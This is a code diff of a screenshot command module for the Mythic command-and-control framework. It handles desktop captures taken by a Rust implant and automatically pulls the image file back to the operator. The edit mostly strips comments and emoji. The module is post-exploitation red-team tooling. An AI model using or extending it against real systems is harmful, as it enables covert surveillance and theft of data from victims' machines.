@@ -16,8 +16,8 @@ class ScreenshotCommand(CommandBase):
     cmd = "screenshot"
     needs_admin = False
     help_cmd = "screenshot"
-    description = "Capture the full desktop using native WinAPI (StretchBlt) and upload it as a BMP image with Mythic screenshot UI support."
-    version = 2
+    description = "Capture the full desktop using native WinAPI (StretchBlt) and upload it as a BMP image."
+    version = 3
     author = "b4r0n"
     parameters = []
     attackmapping = ["T1113"]
@@ -28,7 +28,6 @@ class ScreenshotCommand(CommandBase):
     )
 
     async def create_tasking(self, task: MythicTask) -> MythicTask:
-        # Log API usage artifact for operator visibility
         await MythicRPC().execute(
             "create_artifact",
             task_id=task.id,
@@ -41,14 +40,9 @@ class ScreenshotCommand(CommandBase):
     async def process_response(
         self, task: PTTaskMessageAllData, response: any
     ) -> PTTaskProcessResponseMessageResponse:
-        """
-        Process agent response from the Rust agent.
-        Expected format: "screenshot_captured::C:\\path\\to\\file.bmp|12345|screenshot_123.bmp|screenshot"
-        """
         resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
 
         try:
-            # Extract the response text
             if isinstance(response, str):
                 response_text = response
             elif isinstance(response, dict):
@@ -56,7 +50,6 @@ class ScreenshotCommand(CommandBase):
             else:
                 response_text = str(response)
 
-            # Look for the screenshot_captured line
             screenshot_line = None
             for line in response_text.splitlines():
                 if line.startswith("screenshot_captured"):
@@ -64,8 +57,7 @@ class ScreenshotCommand(CommandBase):
                     break
 
             if screenshot_line and screenshot_line.startswith("screenshot_captured::"):
-                # Parse the Apollo-style format
-                remaining = screenshot_line[len("screenshot_captured::") :].strip()
+                remaining = screenshot_line[len("screenshot_captured::"):].strip()
                 parts = remaining.split("|")
 
                 if len(parts) >= 3:
@@ -73,14 +65,12 @@ class ScreenshotCommand(CommandBase):
                     file_size = parts[1].strip()
                     filename = parts[2].strip()
 
-                    # Validate file_size
                     try:
                         size_int = int(file_size)
                     except ValueError:
                         size_int = -1
 
                     if size_int > 0:
-                        # Create download task to pull the file from the agent
                         download_params = {"file": file_path}
                         download_task = await SendMythicRPCTaskCreate(
                             MythicRPCTaskCreateMessage(
@@ -95,21 +85,21 @@ class ScreenshotCommand(CommandBase):
                             await SendMythicRPCResponseCreate(
                                 MythicRPCResponseCreateMessage(
                                     TaskID=task.Task.ID,
-                                    Response=f"✅ Screenshot captured: {filename} ({file_size} bytes). Download task created automatically.".encode(),
+                                    Response=f"Screenshot captured: {filename} ({file_size} bytes). Download task created.".encode(),
                                 )
                             )
                         else:
                             await SendMythicRPCResponseCreate(
                                 MythicRPCResponseCreateMessage(
                                     TaskID=task.Task.ID,
-                                    Response=f"⚠️ Screenshot captured but automatic download failed. File saved at: {file_path}".encode(),
+                                    Response=f"Screenshot captured but automatic download failed. File at: {file_path}".encode(),
                                 )
                             )
                     else:
                         await SendMythicRPCResponseCreate(
                             MythicRPCResponseCreateMessage(
                                 TaskID=task.Task.ID,
-                                Response=f"❌ Invalid file size: {file_size}".encode(),
+                                Response=f"Invalid file size: {file_size}".encode(),
                             )
                         )
                         resp.Success = False
@@ -117,16 +107,15 @@ class ScreenshotCommand(CommandBase):
                     await SendMythicRPCResponseCreate(
                         MythicRPCResponseCreateMessage(
                             TaskID=task.Task.ID,
-                            Response=f"❌ Failed to parse screenshot info from: {screenshot_line}".encode(),
+                            Response=f"Failed to parse screenshot info from: {screenshot_line}".encode(),
                         )
                     )
                     resp.Success = False
             else:
-                # No screenshot_captured line found
                 await SendMythicRPCResponseCreate(
                     MythicRPCResponseCreateMessage(
                         TaskID=task.Task.ID,
-                        Response=f"❌ Agent did not return screenshot_captured format. Response: {response_text[:200]}".encode(),
+                        Response=f"Agent did not return screenshot_captured format. Response: {response_text[:200]}".encode(),
                     )
                 )
                 resp.Success = False
@@ -134,11 +123,5 @@ class ScreenshotCommand(CommandBase):
         except Exception as e:
             resp.Success = False
             resp.Error = str(e)
-            await SendMythicRPCResponseCreate(
-                MythicRPCResponseCreateMessage(
-                    TaskID=task.Task.ID,
-                    Response=f"⚠️ Error processing screenshot response: {str(e)}".encode(),
-                )
-            )
 
         return resp
